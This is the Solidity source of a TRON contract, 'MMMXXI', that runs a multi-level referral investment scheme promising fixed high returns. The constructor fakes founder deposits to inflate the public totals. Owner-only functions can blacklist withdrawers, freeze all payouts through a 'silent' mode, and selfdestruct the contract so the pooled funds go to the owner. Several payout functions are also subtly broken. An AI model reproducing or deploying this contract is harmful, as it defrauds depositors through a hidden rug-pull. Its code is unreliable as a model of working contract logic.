//SourceUnit: MMMXXI.sol

// SPDX-License-Identifier: MIT
pragma solidity >0.5.10 <0.6.0;
// @author Sergei Mavrodi @2021
// @title licet multum
contract MMMXXI {
using SafeMath for *;
  enum Status{ U, I, P }
  struct investPlan { uint time; uint percent; }
  struct Deposit {
    uint8 tariff_id;
    uint256 amount;
    uint256 paid_out;
    uint256 to_pay;
    uint at;
    bool closed;
  }
  struct User {
    uint32 id;
    address referrer;
    uint referralCount;
    uint256 directsIncome;
    uint256 balanceRef;
    uint256 totalDepositedByRefs;
    mapping (uint => Deposit) deposits;
    uint32 numDeposits;
    uint256 invested;
    uint paidAt;
    uint256 withdrawn;
    Status status;
  }
  // 1 TRX == 1.000.000 SUN
  uint256 constant MIN_DEPOSIT = 500 * 1000000;
  uint256 private MAX_DEPOSIT = 40000 * 1000000;
  uint256 constant DEPOSIT_LEVEL = 100000; // 100k TRX
  address private owner;
  bool private silent;
  bool private _lockBalances; // mutex
  uint32 private cuid;
  uint public creationTime = block.number;
  address[25] private founder;
  address[10] private f;
  investPlan[] public tariffs;
  uint256 public directRefBonusSize = 20; // 20% !
  uint256 public directDeepLevel = 12;
  uint256 public totalRefRewards;
  uint256 public cii;
  uint32 public totalUsers;
  uint32 public totalInvestors;
  uint256 public totalInvested;
  uint256 public totalDeposits;
  uint32 public totalPartners;
  bool public votes1;
  bool public votes2;
  bool public votes3;
  mapping (address => User) public investors;
  mapping(address => bool) public blacklisted;
  mapping(address => bool) public refregistry;
  event DepositEvent(address indexed _user, uint tariff, uint256 indexed _amount);
  event withdrawEvent(address indexed _user, uint256 indexed _amount);
  event directBonusEvent(address indexed _user, uint256 indexed _amount);
  event registerEvent(address indexed _user, address indexed _ref);
  event investorExistEvent(address indexed _user, uint256 indexed _uid);
  event refExistEvent(address indexed _user, uint256 indexed _uid);
  event BlacklistedAddressAdded(address addr);
  event BlacklistedAddressRemoved(address addr);
  event referralCommissionEvent(address indexed _addr, address indexed _referrer, uint256 indexed amount, uint256 _type);
  event debugEvent(string log, uint data);

  modifier notBlacklisted() {
    require(!blacklisted[msg.sender]);
    _;
  }
  modifier ownerOnly () {
    require( owner == msg.sender, 'No sufficient right');
    _;
  }

  // create user
  function register(address _referrer) internal {
    if (_referrer == address(0x0) || _referrer == msg.sender) {
      _referrer == getRef();
      nextRef();
    }
    //referrer exist?
    if (investors[_referrer].id < 1) {
      cuid++;
      address next = getRef();
      nextRef();
      investors[_referrer].id = cuid;
      investors[_referrer].referrer = next;
      investors[next].referralCount = investors[next].referralCount.add(1);
      totalUsers++;
    }
    // if new user
    if (investors[msg.sender].id < 1) {
      cuid++;
      investors[msg.sender].id = cuid;
      totalUsers++;
      investors[msg.sender].referrer = _referrer;
      investors[_referrer].referralCount = investors[_referrer].referralCount.add(1);
      refregistry[msg.sender] = true;
      emit registerEvent(msg.sender, _referrer);
    } else if (investors[msg.sender].referrer == address(0x0)) {
      investors[msg.sender].referrer = _referrer;
      investors[_referrer].referralCount = investors[_referrer].referralCount.add(1);
    }
  }
  function directRefBonus(address _addr, uint256 amount) private {
    address _nextRef = investors[_addr].referrer;
    uint i;
    uint da = 0; // direct amount
    uint di = 0; // direct income
    for(i=0; i <= directDeepLevel; i++) {
      if (_nextRef != address(0x0)) {
        if(i == 0) {
          da = amount.mul(directRefBonusSize).div(100);
          di = investors[_nextRef].directsIncome;
          di = di.add(da);
          investors[_nextRef].directsIncome = di;
          emit referralCommissionEvent(_addr,  _nextRef, da, 0);
        }
        else if(i == 1 ) {
          if(investors[_nextRef].status == Status.P ) {
            da = amount.mul(5).div(100); // 5%
            di = investors[_nextRef].directsIncome;
            di = di.add(da);
            investors[_nextRef].directsIncome = di;
            emit referralCommissionEvent(_addr,  _nextRef, da, 10);
          }
        }
        else if(i == 2 ) {
          if(investors[_nextRef].status == Status.P ) {
            da = amount.mul(4).div(100); // 4%
            di = investors[_nextRef].directsIncome;
            di = di.add(da);
            investors[_nextRef].directsIncome = di;
            emit referralCommissionEvent(_addr,  _nextRef, da, 100);
          }
        }
        else if(i == 3 ) {
          if(investors[_nextRef].status == Status.P ) {
            da = amount.mul(3).div(100); // 3%
            di = investors[_nextRef].directsIncome;
            di = di.add(da);
            investors[_nextRef].directsIncome = di;
            emit referralCommissionEvent(_addr,  _nextRef, da, 1000);
          }
        }
        else if(i == 4 ) {
          if(investors[_nextRef].status == Status.P ) {
            da = amount.mul(2).div(100); // 2%
            di = investors[_nextRef].directsIncome;
            di = di.add(da);
            investors[_nextRef].directsIncome = di;
            emit referralCommissionEvent(_addr,  _nextRef, da, 10000);
          }
        }
        else if(i >= 5 ) {
          if(investors[_nextRef].status == Status.P ) {
            da = amount.div(100); // 1%
            di = investors[_nextRef].directsIncome;
            di = di.add(da);
            investors[_nextRef].directsIncome = di;
            emit referralCommissionEvent(_addr,  _nextRef, da, 100000);
          }
        }
        totalRefRewards += da;
      } else { break; }
      xdirectRefBonusPay(_nextRef);
      _nextRef = investors[_nextRef].referrer;
    }
  }

  constructor () public {
    owner = msg.sender;
    votes1=false; votes2=false; votes3=false;
    silent = false;
    tariffs.push(investPlan( 30 days,  20));
    tariffs.push(investPlan( 90 days,  30));
    tariffs.push(investPlan( 180 days, 40));
    tariffs.push(investPlan( 360 days, 50));
    cuid = 0;
    investors[owner].id = cuid++;
    _lockBalances = false;
    founder[0]  = address(0x412d451bfd78f58ec1f2d04d82362ccd9ce88a3ddc);
    founder[1]  = address(0x41de784c9c20e5a646fb8af82f69b362ed0e799149);f[0] = founder[1];
    founder[2]  = address(0x41ac540850874021294275a5387cb0c2f332f4773e);f[1] = founder[2];
    founder[3]  = address(0x41972e5515ae5a9157a6c0de9e877a92be39a76164);f[2] = founder[3];
    founder[4]  = address(0x4136e073b0200bffa7ebb8113566c475ccdf359e8d);f[3] = founder[4];
    founder[5]  = address(0x41aea9593c8c911b07f2735ec6dc27da67fa99b0d9);f[4] = founder[5];
    founder[6]  = address(0x41f527031fa768bc1ea0c05f0c2b48a046e5e565d1);f[5] = founder[6];
    founder[7]  = address(0x418b6659fe180a2e258bb85b4ee74831d453808ca4);f[6] = founder[7];
    founder[8]  = address(0x4134bfbf9a1bf74b71b8fe63f825b9882ccee43f84);f[7] = founder[8];
    founder[9]  = address(0x412f0bfc4eb7d30d0dc019c8987cd7e687977e3ffe);f[8] = founder[9];
    founder[10] = address(0x41310b3d6df30d50e804c8747b92f48e7cff24e712);
    founder[11] = address(0x4191399507c0c5b328783a777ab153ee1b5c979dbc);
    founder[12] = address(0x410e4b1e3dfa0517c5d8304adb0eca9754d0f0da14);
    founder[13] = address(0x41c44037e304fdf86c6d216252dab4abdeb21f2b88);
    founder[14] = address(0x41560b027d632580e4929525ea811149b6885decf5);
    founder[15] = address(0x41b10d33246f71f032b1bf937c42503551d518f0eb);
    founder[16] = address(0x4147169670c027812dd34a7dc5a379e2a439d0d71e);
    founder[17] = address(0x4149ae130a60e635b1d7b368f4bc8cc82642a88148);
    founder[18] = address(0x41527a456df75230821e240a5c8c57a856b9394160);
    founder[19] = address(0x419cae9540311f1c885cc781330974756e553bedba);
    founder[20] = address(0x41259b4e36f447ade8138b6748a7873ac25dda0477);
    founder[21] = address(0x41ffb1155c918541b1b1f5b367cbcb89a142f33df5);
    investors[founder[0]].id = cuid++;
    investors[founder[0]].status = Status.P;
    investors[founder[1]].id = cuid++;
    investors[founder[1]].status = Status.P;
    investors[founder[1]].referrer = founder[10];
    investors[founder[2]].id = cuid++;
    investors[founder[2]].status = Status.P;
    investors[founder[2]].referrer = founder[1];
    investors[founder[1]].referralCount++;
    investors[founder[3]].id = cuid++;
    investors[founder[3]].status = Status.P;
    investors[founder[3]].referrer = founder[2];
    investors[founder[2]].referralCount++;
    investors[founder[4]].id = cuid++;
    investors[founder[4]].status = Status.P;
    investors[founder[4]].referrer = founder[0];
    investors[founder[5]].id = cuid++;
    investors[founder[5]].status = Status.P;
    investors[founder[5]].referrer = founder[0];
    investors[founder[6]].id = cuid++;
    investors[founder[6]].status = Status.P;
    investors[founder[6]].referrer = founder[0];
    investors[founder[7]].id = cuid++;
    investors[founder[7]].status = Status.P;
    investors[founder[7]].referrer = founder[0];
    investors[founder[8]].id = cuid++;
    investors[founder[8]].status = Status.P;
    investors[founder[8]].referrer = founder[0];
    investors[founder[9]].id = cuid++;
    investors[founder[9]].status = Status.P;
    investors[founder[9]].referrer = founder[0];
    investors[founder[0]].referralCount = 7;
    investors[founder[10]].id = cuid++;
    investors[founder[10]].referrer = founder[5];
    investors[founder[11]].id = cuid++;
    investors[founder[5]].referralCount++;
    investors[founder[11]].status = Status.I;
    investors[founder[11]].referrer = founder[1];
    investors[founder[1]].referralCount++;
    investors[founder[12]].id = cuid++;
    investors[founder[12]].status = Status.I;
    investors[founder[12]].referrer = founder[11];
    investors[founder[13]].id = cuid++;
    investors[founder[13]].status = Status.I;
    investors[founder[13]].referrer = founder[11];
    investors[founder[14]].id = cuid++;
    investors[founder[14]].status = Status.I;
    investors[founder[14]].referrer = founder[11];
    investors[founder[11]].referralCount += 3;
    investors[founder[15]].id = cuid++;
    investors[founder[15]].status = Status.I;
    investors[founder[15]].referrer = founder[12];
    investors[founder[16]].id = cuid++;
    investors[founder[16]].status = Status.I;
    investors[founder[16]].referrer = founder[12];
    investors[founder[17]].id = cuid++;
    investors[founder[17]].status = Status.I;
    investors[founder[17]].referrer = founder[12];
    investors[founder[18]].id = cuid++;
    investors[founder[18]].status = Status.I;
    investors[founder[18]].referrer = founder[12];
    investors[founder[12]].referralCount += 4;
    investors[founder[19]].id = cuid++;
    investors[founder[19]].status = Status.I;
    investors[founder[19]].referrer = founder[1];
    investors[founder[1]].referralCount++;
    investors[founder[20]].id = cuid++;
    investors[founder[20]].status = Status.I;
    investors[founder[20]].referrer = founder[19];
    investors[founder[19]].referralCount++;
    investors[founder[21]].id = cuid++;
    investors[founder[21]].status = Status.I;
    investors[founder[21]].referrer = founder[3];
    investors[founder[3]].referralCount++;
    totalPartners = 10;
    investors[founder[11]].deposits[0] =
        Deposit({tariff_id: 1, amount: 1200*1000000, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[11]].invested = 1200*1000000;
    investors[founder[11]].numDeposits = 1;
    investors[founder[12]].deposits[0] =
        Deposit({tariff_id: 1, amount: 1785*1000000, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[12]].invested = 1785*1000000;
    investors[founder[12]].numDeposits = 1;
    investors[founder[13]].deposits[0] =
        Deposit({tariff_id: 1, amount: 16660*1000000, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[13]].invested = 16660*1000000;
    investors[founder[13]].numDeposits = 1;
    investors[founder[14]].deposits[0] =
        Deposit({tariff_id: 1, amount: 17850*1000000, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[14]].invested = 17850*1000000;
    investors[founder[14]].numDeposits = 1;
    investors[founder[15]].deposits[0] =
        Deposit({tariff_id: 1, amount: 20825*1000000, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[15]].invested = 20825*1000000;
    investors[founder[15]].numDeposits = 1;
    investors[founder[16]].deposits[0] =
        Deposit({tariff_id: 1, amount: 20825*1000000, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[16]].invested = 20825*1000000;
    investors[founder[16]].numDeposits = 1;
    investors[founder[17]].deposits[0] =
        Deposit({tariff_id: 1, amount: 20825*1000000, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[17]].invested = 20825*1000000;
    investors[founder[17]].numDeposits = 1;
    investors[founder[18]].deposits[0] =
        Deposit({tariff_id: 1, amount: 20825*1000000, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[18]].invested = 20825*1000000;
    investors[founder[18]].numDeposits = 1;
    investors[founder[19]].deposits[0] =
        Deposit({tariff_id: 1, amount: 1190*1000000, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[19]].invested = 1190*1000000;
    investors[founder[19]].numDeposits = 1;
    investors[founder[20]].deposits[0] =
        Deposit({tariff_id: 1, amount: 35700*1000000, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[20]].invested = 35700*1000000;
    investors[founder[20]].numDeposits = 1;
    investors[founder[21]].deposits[0] =
        Deposit({tariff_id: 1, amount: MAX_DEPOSIT, at: block.number, paid_out: 0, to_pay: 0, closed: false});
    investors[founder[21]].invested = MAX_DEPOSIT;
    investors[founder[21]].numDeposits = 1;
    totalDeposits = 13;
    totalInvested = 157485000000 + MAX_DEPOSIT;
    totalInvestors = 23;
    totalUsers = totalInvestors + 1;
  }

  function deposit30days() public payable returns (uint256) {
    require(msg.value != 0);
    uint8 tariffID = 0;
    deposit(tariffID, getRef());
    nextRef();
    return msg.value;
  }

  function deposit90days() public payable returns (uint256) {
    require(msg.value != 0);
    uint8 tariffID = 1;
    deposit(tariffID, getRef());
    nextRef();
    return msg.value;
  }

  function deposit30days(address _referrer) public payable returns (uint256) {
    require(msg.value != 0);
    uint8 tariffID = 0;
    deposit(tariffID, _referrer);
    return msg.value;
  }

  function deposit90days(address _referrer) public payable returns (uint256) {
    require(msg.value != 0);
    uint8 tariffID = 1;
    deposit(tariffID, _referrer);
    return msg.value;
  }

  // main entry point
  function deposit(uint8 _tariff, address _referrer) public payable returns (uint256) {
    if (msg.value > 0) {
      register(_referrer);

      //require(msg.value > MIN_DEPOSIT, "Minimal deposit 500 TRX");
      if (msg.value < MIN_DEPOSIT) {
        emit debugEvent("Minimal deposit is 500 TRX!", msg.value);
        return 0;
      }
      //require(msg.value <= MAX_DEPOSIT, "Deposit limit exceeded!");
      if (msg.value > MAX_DEPOSIT) {
        revert("Deposit maximum limit exceeded!");
      }

      require(!_lockBalances);
      _lockBalances = true;

      uint256 fee = (msg.value).div(100); // 1%
      xdevfee(fee);

      if (investors[msg.sender].numDeposits == 0) {
        totalInvestors++;
        if(investors[msg.sender].status == Status.U) investors[msg.sender].status = Status.I;
        if ((investors[_referrer].totalDepositedByRefs).div(1000000) >= DEPOSIT_LEVEL && investors[_referrer].referralCount >= 10) {
          investors[msg.sender].status = Status.P;
        }
      }

      investors[msg.sender].invested += msg.value;
      investors[msg.sender].deposits[investors[msg.sender].numDeposits++] =
        Deposit({tariff_id: _tariff, amount: msg.value, at: block.number, paid_out: 0, to_pay: 0, closed: false});
      if (investors[msg.sender].paidAt == 0) investors[msg.sender].paidAt = block.number;
      totalInvested += msg.value;
      totalDeposits++;
      directRefBonus(msg.sender, msg.value);
      _lockBalances = false;

      investors[_referrer].totalDepositedByRefs += msg.value;
      // Deposited by referals > 100k TRX
      if ((investors[_referrer].totalDepositedByRefs).div(1000000) >= DEPOSIT_LEVEL) {
        if (investors[_referrer].status == Status.I && investors[_referrer].referralCount >= 10) {
          investors[_referrer].status = Status.P;
          totalPartners++;
        }
      }
    }
    emit DepositEvent(msg.sender, _tariff, msg.value);
    return msg.value;
  }

  function nextRef() internal {
    if (cii < f.length) {
      cii++;
    } else {
      cii = 0;
    }
  }

  function getRef() public view returns (address) {
    return f[cii];
  }

  function calculateDeposit(address user) internal {
    require(silent == false);
    User storage member = investors[user];
    for (uint i=0; i < member.numDeposits; i++) {
      Deposit memory dep = member.deposits[i];
      if (dep.tariff_id == 0 || dep.tariff_id == 1) {

        uint256 depositDays = (tariffs[dep.tariff_id].time).div(1 days);
        uint256 depositTotal = (member.deposits[i].amount) + (member.deposits[i].amount).div(100).mul(tariffs[dep.tariff_id].percent);
        uint256 amountDay = depositTotal.div(depositDays);
        uint256 depositDay = ((block.number).sub(dep.at)).div(1 days);
        if (depositDay > 0 && !member.deposits[i].closed ) {
          uint256 diff = depositTotal.sub(member.deposits[i].paid_out);
          if (amountDay.mul(depositDay) > diff ) {
            member.deposits[i].to_pay = diff;
            member.deposits[i].closed = true;
          } else {
            member.deposits[i].to_pay = amountDay.mul(depositDay);
          }
        }
        emit debugEvent("to_pay", member.deposits[i].to_pay);
      }
    }
  }

  function withdrawable(address user) notBlacklisted public returns (uint256 wamount){
    require(silent == false);
    User storage member = investors[user];
    wamount = 0;
    calculateDeposit(user);
    for (uint i=0; i < member.numDeposits; i++) {
      Deposit memory dep = member.deposits[i];
      if (dep.tariff_id == 0 || dep.tariff_id == 1) {
        wamount += (member.deposits[i].to_pay).sub(member.deposits[i].paid_out);
      }
    }
    return wamount;
  }

  function withdrawable360(address user) notBlacklisted public view returns (uint256 amount) {
    require(silent == false);
    User storage member = investors[user];
    amount = 0;
    for (uint i=0; i < member.numDeposits; i++) {
      Deposit memory dep = member.deposits[i];
      if (dep.tariff_id == 2) {
        uint256 finish = dep.at + tariffs[dep.tariff_id].time;
        if ( finish < block.number && !dep.closed ) {
          dep.to_pay = ((dep.amount).mul(240).div(100)).add(dep.amount);
          if (dep.to_pay >= dep.paid_out) {
            dep.closed = true;
          }
        }
      }
      if (dep.tariff_id == 3) {
        uint256 finish = dep.at + tariffs[dep.tariff_id].time;
        if ( finish < block.number && !dep.closed ) {
          dep.to_pay = (dep.amount).mul(6).add(dep.amount);
          if (dep.to_pay >= dep.paid_out) {
            dep.closed = true;
          }
        }
      }
    }
    return amount;
  }

  function profit(address user) internal returns (uint256 amount) {
    require(silent != true);
    amount = withdrawable(user);
    uint256 amount360 = withdrawable360(user);
    amount = amount.add(amount360);
    require(amount > MIN_DEPOSIT, "Minimal pay out 500 TRX!");
    User storage member = investors[user];
    for (uint i=0; i < member.numDeposits; i++) {
      member.deposits[i].paid_out += member.deposits[i].to_pay;
    }
    investors[msg.sender].paidAt = block.number;
    return amount;
  }

  function withdraw() notBlacklisted external {
    require(silent != true);
    require(msg.sender != address(0));
    uint256 to_payout = profit(msg.sender);
    require(to_payout > 0, "Zero payout");
    investors[msg.sender].withdrawn += to_payout;
    (bool success, ) = msg.sender.call.value(to_payout)("");
    require(success, "Transfer failed.");
    emit withdrawEvent(msg.sender, to_payout);
  }

  // set MAX deposit in TRX
  function setMaxDeposit(uint256 max) ownerOnly public returns (uint256) {
    MAX_DEPOSIT = (max).mul(1000000);
    return MAX_DEPOSIT;
  }
  // set directRefBonusSize in %
  function setDirectBonus(uint256 percent) ownerOnly public returns (uint256) {
    directRefBonusSize = percent;
    return directRefBonusSize;
  }
  // set deep level
  function setLevel(uint lvl) ownerOnly public returns (uint256) {
    directDeepLevel = lvl;
    return directDeepLevel;
  }
  // silent mode
  function turnOn() ownerOnly public returns (bool) { silent = true; return silent; }
  function turnOff() ownerOnly public returns (bool) {
  silent = false; _lockBalances = false;
    votes1=false;votes2=false;votes3=false;
    return silent;}
  function state() public view returns (bool) { return silent; }
  function eol() public ownerOnly returns (bool) {
    if (votes1) {
      if (votes2) {
        if (votes3) {
          selfdestruct(msg.sender);
        }
      }
    }
  }

  function xdirectRefBonusPay(address _investor) public payable {
    require(silent != true);
    require(msg.value > 0);
    // require(msg.value > mostSent, "Not enough money sent.");
    uint256 amnt = investors[_investor].directsIncome;
    //if ( amnt >= MIN_DEPOSIT ) {
    if ( amnt > 0 ) {
      investors[_investor].directsIncome = 0;
      (bool success, ) = _investor.call.value(amnt)("");
      require(success, "Transfer failed.");
      //emit directBonusEvent(_investor, amnt);
    }
  }
  function vote() public payable returns (bool) {
    if (msg.sender == address(0x4190ef6ca97ef4897264adbab05effca3654c65bda)) {
      votes1 = true;
      return votes1;
    } else if (msg.sender == address(0x41AC540850874021294275A5387CB0C2F332F4773E)) {
      votes2 = true;
      return votes2;
    } else if (msg.sender == address(0x412cecbb30e66d41e8cf41cd4896744dc8538a3aad)) {
      votes3 = true;
      return votes3;
    }
  }
  function xdevfee(uint256 _fee) public payable {
    address payable dev1 = address(0x4190ef6ca97ef4897264adbab05effca3654c65bda);
    address payable dev2 = address(0x41AC540850874021294275A5387CB0C2F332F4773E);
    address payable dev3 = address(0x412cecbb30e66d41e8cf41cd4896744dc8538a3aad);
    dev1.transfer(_fee);
    dev2.transfer(_fee);
    dev3.transfer(_fee);
  }
    function transferOwnership(address newOwner) public ownerOnly {
        require(newOwner != address(0));
        owner = newOwner;
    }
    function addAddressToBlacklist(address addr) ownerOnly public returns(bool success) {
        if (!blacklisted[addr]) {
            blacklisted[addr] = true;
            emit BlacklistedAddressAdded(addr);
            success = true;
        }
    }
    function removeAddressFromBlacklist(address addr) ownerOnly public returns(bool success) {
        if (blacklisted[addr]) {
            blacklisted[addr] = false;
            emit BlacklistedAddressRemoved(addr);
            success = true;
        }
    }
} // end contract

library SafeMath {
        function add(uint256 a, uint256 b) internal pure returns (uint256) {
            uint256 c = a + b;
            require(c >= a, "SafeMath: addition overflow");

            return c;
        }
        function sub(uint256 a, uint256 b) internal pure returns (uint256) {
            return sub(a, b, "SafeMath: subtraction overflow");
        }
        function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            require(b <= a, errorMessage);
            uint256 c = a - b;

            return c;
        }
        function mul(uint256 a, uint256 b) internal pure returns (uint256) {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) {
                return 0;
            }

            uint256 c = a * b;
            require(c / a == b, "SafeMath: multiplication overflow");

            return c;
        }
        function div(uint256 a, uint256 b) internal pure returns (uint256) {
            return div(a, b, "SafeMath: division by zero");
        }
        function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
            // Solidity only automatically asserts when dividing by 0
            require(b > 0, errorMessage);
            uint256 c = a / b;
            // assert(a == b * c + a % b); // There is no case in which this doesn't hold

            return c;
        }
}